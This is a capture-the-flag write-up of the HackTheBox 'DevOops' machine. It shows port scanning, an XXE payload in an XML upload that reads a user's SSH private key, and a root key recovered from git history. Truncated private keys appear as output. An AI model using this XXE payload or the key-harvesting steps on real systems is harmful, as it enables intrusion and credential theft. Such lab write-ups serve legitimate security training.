---
layout: post
title:  "devOops"
category: writeups
author: mrtn
---

This is probably one of my most favourite boxes that have been released on hackthebox so far.

Before we start we prepare the `/etc/hosts` that we don't have to type the IP all the time:

```bash
echo "\n10.10.10.91 devoops.htb devoops" >> /etc/hosts
```

Before we can do anything else, we have to look against what we're up to.

## Recon 

```bash
nmap -v -sS -p- -A -T4 -oA
# Nmap 7.70 scan initiated Sun Sep 16 21:10:28 2018 as: nmap -v -sS -p- -A -T4 -oA devoops.htb/devoops.htb devoops.htb
Nmap scan report for devoops.htb (10.10.10.91)
Host is up (0.016s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)
|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)
|_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)
5000/tcp open  http    Gunicorn 19.7.1
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-server-header: gunicorn/19.7.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
```

Nothing too fancy here. A simple Website on `5000` and ssh - let's move on to brute forcing hidden directories:

```bash
dirb http://10.10.10.91:5000

---- Scanning URL: http://10.10.10.91:5000/ ----
+ http://10.10.10.91:5000/feed (CODE:200|SIZE:546263)
+ http://10.10.10.91:5000/upload (CODE:200|SIZE:347)
```

## Initial Foothold

This looks promising. Uploads are always a good idea. Seems like an upload form for `XML` Files. 
To poke a bit around, let's first try to get a valid format and upload that. From that point onward, we can try to create an exploit. 

The following file is valid and gets accepted. 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
<Author>author_value</Author>
<Subject>subject_value</Subject>
<Content>content_value</Content>
</root>
```

Time to do some research on `XML` - or rather `XXE`, which is part of the [OWASP Top 10](https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE)).

Now we try to inject a `READ` command via `XEE`. This one is the final one, that brings us to our goal. To validate the attack in general, start with reading `file:///etc/passwd`.

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///home/roosa/.ssh/id_rsa"> ]>
<root>
 <Author>John</Author>
 <Subject>&ent;</Subject>
 <Content>_</Content>
</root>
```

With the extracted *private* ssh key, we can now log in as roosa.

```text
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuMMt4qh[/ib86xJBLmzePl6/5ZRNJkUj/Xuv1+d6nccTffb/7
...
...
...s
82W3d4vCUPkKnrgG8F7s3GL6cqWcbZ]Bd0j9u88fUWfPxfRaQU3s=
-----END RSA PRIVATE KEY-----
```

```bash
chmod 700 devoops.id_rsa
ssh -i devoops.id_rsa roosa@devoops.htbs
```

Success, logged in via `ssh private key`. Time to take the user flag:

```bash
cat user.txt
c5808...flaaaaaaaaaag...7b
```

## Privilege Escalation

Back to square one. We gained access to the machine - let's do some recon again.

Before we branch out into the file system, let's check the home folder of the user we just compromised. 

The folder `/home/roosa/work/blogfeed` looks like a promising target. It's a git repository, where roosa stores her work on the blogfeed with which we gained access.

```bash
git log
...
    reverted accidental commit with proper key
```

Interesting - some sort of key? 


```bash
git checkout <REVISION-UUID>
```

```text
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
...
...
oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=
-----END RSA PRIVATE KEY-----
```

Yet another private key - let's see, if this is the root-key:


```bash
cat authcredentials.key > devoops.id_rsa_root
chmod 700 devoops.id_rsa_root
ssh -X -i devoops_id_rsa_root root@10.10.10.91
```

Gotcha!

```bash
whoami
root
```

Time to collect the root flag and dance!

```bash
cat /root/root.txt
d4fe1...........s1ac7b3
```

## References

* [DevOops@htb](https://www.hackthebox.eu/home/machines/profile/140)
* [XXE OWASP Top 10](https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE))